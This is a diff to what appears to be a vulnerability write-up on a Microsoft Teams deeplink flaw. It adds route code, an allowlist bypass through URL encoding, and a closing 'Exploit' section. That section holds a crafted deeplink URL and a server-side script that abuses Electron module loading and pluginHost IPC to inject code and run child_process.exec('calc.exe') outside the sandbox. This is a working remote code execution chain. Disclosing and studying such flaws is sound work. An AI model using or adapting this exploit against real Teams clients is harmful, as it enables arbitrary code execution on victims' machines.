@@ -14,9 +14,35 @@ The deeplink handler for /l/task/:appId in Microsoft Teams can load an arbitrary
 Attacker can leaverage this with teams RPC's functionality to get code execution outside the sandbox.
 
 #### 1. URL allowlist bypass using url encoding
+URL Route example
+```js
+...
+k(p.states.appDeepLinkTaskModule, {
+    url: "l/task/:appId?url&height&width&title&fallbackURL&card&completionBotId"
+}),
+k(p.states.appSfbFreQuickStartVideo, {
+    url: "sfbfrequickstartvideo"
+}),
+k(p.states.appDeepLinkMeetingCreate, {
+    url: "l/meeting/new?meetingType&groupId&tenantId&deeplinkId&attendees&subject&content&startTime&endTime&nobyoe&qsdisclaimer"
+}),
+k(p.states.appDeepLinkMeetingDetails, {
+    url: "l/meeting/:tenantId/:organizerId/:threadId/:messageId?deeplinkId&nobyoe&qsdisclaimer"
+}),
+k(p.states.appDeepLinkMeetingDetailsEventId, {
+    url: "l/meeting/details?eventId&deeplinkId"
+}),
+k(p.states.appDeepLinkVirtualEventCreate, {
+    url: "l/virtualevent/new?eventType"
+}),
+k(p.states.appDeepLinkVirtualEventDetails, {
+    url: "l/virtualevent/:eventId"
+}),
+...
+```
 
-In Microsoft Teams, there is a handler for /l/task/:appId which accepts `url` as a parameter.
-This allows bots created by Teams applications to send a link to user, which should be in the url allowlist.
+In Microsoft Teams, there is a url route handler for /l/task/:appId which accepts `url` as a parameter.
+This allows chat bot created by Teams applications to send a link to user, which should be in the url allowlist.
 
 The allowlist is constructed from various fields of app definition:
 
@@ -29,10 +55,18 @@ return e.galleryTabs && a.push.apply(a, _.map(e.galleryTabs, function (e) {
 })), e.connectors && a.push.apply(a, _.map(e.connectors, function (e) {
     return i.utilityService.parseUrl(e.configurationUrl).host
 ```
+```
 
 These domains are converted into regular expressions, and are used to validate the url:
+```
+...
+www.office.com
+www.github.com
+...
+```
 
 ```js
+...
 t.prototype.isUrlInDomainList = function(e, t, n) {
     void 0 === n && (n = !1);
     for (var i = n ? e : this.parseUrl(e).href, s = 0; s < t.length; s++) {
@@ -44,6 +78,7 @@ t.prototype.isUrlInDomainList = function(e, t, n) {
     }
     return !1
 }
+...
 ```
 
 Regardless of the third parameter `n`, if the original url matches the given regular expression, this check is passed.
@@ -304,3 +339,36 @@ var ipc = modules['./lib/renderer/api/ipc-renderer.ts'].exports.default;
 ```
 
 We utilized this to send IPC to pluginHost (see Section 2), and execute a program outside the sandbox.
+
+
+#Exploit
+
+Client :  
+`https://teams.live.com/l/task/1ded03cb-ece5-4e7c-9f73-61c375528078?url=https://0e1%252Ekr%5Ccd2c4753c4cb873c7be66e3ffdeae71f71ce33482e9921bab01dc3670a3b4f95%5C%23.office.com/&height=100&width=100&title=hey&fallbackURL=https://aka.ms/hey&completionBotId=&fqdn=teams.live.com`
+
+
+Server :  
+```html
+<script>
+  const KEY = './lib/renderer/api/web-frame.ts';
+  let modules;
+  Object.prototype.__defineGetter__(KEY, function () {
+    console.log(this);
+    modules = this;
+    delete Object.prototype[KEY];
+    main();
+  })
+
+  window.ELECTRON_ENABLE_SECURITY_WARNINGS = true;
+
+  function main() {
+    var ipc = modules['./lib/renderer/api/ipc-renderer.ts'].exports.default;
+    [_, pluginHost] = ipc.sendSync('calling:teams:ipc:initPluginHost', []);
+    msg = ipc.sendToRendererSync(pluginHost, 'ELECTRON_REMOTE_SERVER_REQUIRE', [{ hey: 1 }, 'slimcore'], '')[0]
+    msg = ipc.sendToRendererSync(pluginHost, 'ELECTRON_REMOTE_SERVER_MEMBER_GET', [{ hey: 1 }, msg.id, 'constructor', []], '')[0]
+    msg = ipc.sendToRendererSync(pluginHost, 'ELECTRON_REMOTE_SERVER_MEMBER_CALL', [{ hey: 1 }, msg.id, 'constructor', [{ type: 'value', value: 'var backup=String.prototype.replace; String.prototype.replace = ()=>"slimcore\');require(`child_process`).exec(`calc.exe`);(\'";' }]], '')[0]
+    ipc.sendToRendererSync(pluginHost, 'ELECTRON_REMOTE_SERVER_FUNCTION_CALL', [{ hey: 1 }, msg.id, []], '')
+    msg = ipc.sendToRendererSync(pluginHost, 'ELECTRON_REMOTE_SERVER_REQUIRE', [{ hey: 1 }, 'slimcore'], '')
+  }
+</script>
+``` 
